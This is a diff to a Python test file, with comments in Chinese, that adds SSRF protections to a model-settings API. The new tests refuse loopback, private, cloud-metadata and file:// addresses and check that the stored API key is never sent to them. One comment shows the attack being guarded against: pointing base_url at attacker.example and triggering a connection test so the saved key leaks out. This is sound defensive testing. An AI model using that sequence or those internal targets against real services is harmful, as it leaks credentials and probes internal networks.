@@ -18,6 +18,7 @@
 """
 from __future__ import annotations
 
+import asyncio
 import json
 import logging
 import sqlite3
@@ -149,6 +150,36 @@ def test_saving_identical_values_reports_unchanged():
     second = client.put("/api/settings/model", json=payload).json()
     assert second["changed"] is False
     assert second["updated_at"] == stamp
+
+
+def test_changing_the_address_says_the_old_test_no_longer_holds():
+    """改地址后回一句提醒：上一次「测试连接」成功，证明的是**旧地址**。
+
+    这是 P0-1 的第二层。光靠第一层（拒内网）挡不住"改指向一个公网攻击者地址、
+    再让别人点测试"——那条路径每一跳看起来都合法。提醒不会阻止谁，但它让
+    "我刚改过地址"这件事在保存的那一刻出现在眼前，而不是等生成 401 之后。
+    """
+    first = client.put("/api/settings/model", json=_body(
+        base_url="https://a.example/v1", api_key=SECRET, model="m")).json()
+    assert first["notice"] is None, "第一次保存没有「旧地址」可言"
+
+    moved = client.put("/api/settings/model", json=_body(base_url="https://b.example/v1")).json()
+    assert moved["notice"]
+    assert "测试连接" in moved["notice"]
+
+    # 再存一次同样的地址：没有变化，就不该继续念叨。
+    again = client.put("/api/settings/model", json=_body(base_url="https://b.example/v1")).json()
+    assert again["notice"] is None
+
+
+def test_trailing_slash_alone_is_not_a_change():
+    """只补/去一个末尾斜杠不算改地址——规范化之后两者是同一个端点。
+
+    把它当"改了"会让每次保存都弹一句"建议重新测试"，提醒一多就成了噪声。
+    """
+    client.put("/api/settings/model", json=_body(base_url="https://x.example/v1"))
+    body = client.put("/api/settings/model", json=_body(base_url="https://x.example/v1/")).json()
+    assert body["notice"] is None
 
 
 def test_empty_api_key_means_keep_the_saved_one():
@@ -849,3 +880,110 @@ def test_saved_row_is_readable_as_json_shape():
     }
     # 打码值能被 JSON 序列化（省略号是普通字符，不是控制字符）。
     json.dumps(body, ensure_ascii=False)
+
+
+# ---------------------------------------------------------------- 地址不许乱填
+#
+# P0-1：**无鉴权 + 任意 base_url = 三步把已存密钥明文送到任意地址**。
+#   PUT  {"base_url": "https://attacker.example"}   → 200
+#   POST /model/test  {}                            → 空 body 走"回落生效值"，密钥出门
+# 攻击者既不需要知道密钥，也不需要读得到响应。这一组钉住"发请求之前先挡一道"。
+
+
+@pytest.mark.parametrize(
+    "url",
+    [
+        "http://localhost:11434/v1",
+        "http://127.0.0.1:11434/v1",
+        "http://[::1]:11434/v1",
+        "http://10.0.0.5/v1",
+        "http://172.16.3.4/v1",
+        "http://192.168.1.1/v1",
+        "http://169.254.169.254/latest/meta-data",
+        "http://0.0.0.0:8000/v1",
+        "http://model.local/v1",
+    ],
+)
+def test_private_and_loopback_addresses_are_refused(url):
+    """本机 / 内网 / 云元数据 / 链路本地 / `0.0.0.0` 全部拒。
+
+    `0.0.0.0` 单列一条：它在多数系统上连的是本机，而 `ip.is_private` **不覆盖**
+    它——只写 `is_private` 的实现会把它放过去。
+    """
+    reason = probe_module._refuse(url)
+    assert reason, f"{url} 被放行了，密钥可以被送到这里"
+    # 拒绝理由要能指向"怎么才允许"：只说"不许"会让人以为这个地址永远填不了。
+    assert probe_module.ALLOW_PRIVATE_ENV in reason
+
+
+@pytest.mark.parametrize(
+    "url",
+    [
+        "https://api.deepseek.com/v1",
+        "https://api.openai.com/v1",
+        "https://dashscope.aliyuncs.com/compatible-mode/v1",
+        "http://1.2.3.4/v1",  # 公网 IP 字面量：允许（有人的自建端点在公网 IP 上）
+    ],
+)
+def test_public_addresses_are_allowed(url):
+    """公网地址一律放行——这个校验不是白名单，别把它做成"只许几家厂商"。"""
+    assert probe_module._refuse(url) is None
+
+
+@pytest.mark.parametrize(
+    "url",
+    ["file:///etc/passwd", "ftp://example.com/v1", "not-a-url", "", "https://"],
+)
+def test_addresses_that_are_not_http_are_refused(url):
+    """非 http(s) 与解析不出来的地址在发请求之前就拒。
+
+    `file:///etc/passwd` 拼上 `/chat/completions` 之后的行为完全取决于 httpx 版本，
+    不该由它决定；空串则应该由更早的 `settings_incomplete` 拦，这里也顺手挡住。
+    """
+    assert probe_module._refuse(url)
+
+
+def test_the_switch_reopens_private_addresses(monkeypatch):
+    """自建端点是合法需求：开关一开就全放行。
+
+    这也顺带钉住"开关是**每次现读**的"——做成模块级常量时 `monkeypatch.setenv`
+    不会生效，这条会红。
+    """
+    monkeypatch.setenv(probe_module.ALLOW_PRIVATE_ENV, "1")
+    assert probe_module._refuse("http://127.0.0.1:11434/v1") is None
+    assert probe_module._refuse("http://10.0.0.5/v1") is None
+    monkeypatch.setenv(probe_module.ALLOW_PRIVATE_ENV, "0")
+    assert probe_module._refuse("http://127.0.0.1:11434/v1")
+
+
+def test_probe_never_opens_a_connection_to_a_private_address(monkeypatch):
+    """最重要的一条：**假客户端一次都没被调用**。
+
+    只断言"返回 ok=false"是不够的——真正的伤害发生在请求发出去的那一刻，
+    而 `ProbeResult` 在超时、连不上、密钥被拒时也全是 `ok=false`。
+    """
+    sent = _use_fake(monkeypatch, response=_FakeResponse(200, {
+        "model": "m", "choices": [{"message": {"content": "p"}}],
+    }))
+    body = client.post("/api/settings/model/test", json=_body(
+        base_url="http://169.254.169.254", api_key=SECRET, model="m"))
+    assert body.status_code == 400
+    assert body.json()["code"] == "settings_base_url_refused"
+    assert sent == [], "请求发出去了，密钥已经出门"
+
+
+def test_probe_itself_refuses_without_opening_a_connection(monkeypatch):
+    """接口层是 400，`probe()` 自己是 `ok=false` 的结论——两条路都不发请求。
+
+    第二层兜底是给"将来有后台任务直接调 `probe()`"留的：那时没有 router 那一道，
+    只有这里。`latency_ms=0` 与 `status=None` 是"一个字节都没发"的可见证据。
+    """
+    sent = _use_fake(monkeypatch, response=_FakeResponse(200, {"choices": []}))
+    result = asyncio.run(
+        probe_module.probe("http://127.0.0.1:11434/v1", SECRET, "m"))
+    assert result.ok is False
+    assert result.status is None
+    assert result.latency_ms == 0
+    assert SECRET not in result.message
+    assert sent == [], "请求发出去了，密钥已经出门"
+
